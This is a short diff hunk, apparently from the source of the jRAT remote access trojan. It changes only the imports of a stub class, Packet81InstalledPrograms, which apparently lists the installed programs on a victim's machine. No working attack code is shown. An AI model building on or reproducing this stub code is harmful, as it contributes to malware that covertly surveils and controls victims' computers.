@@ -2,12 +2,10 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
 import io.jrat.stub.packets.outgoing.Packet55InstalledProgram;
-
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStreamReader;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 
 public class Packet81InstalledPrograms extends AbstractIncomingPacket {
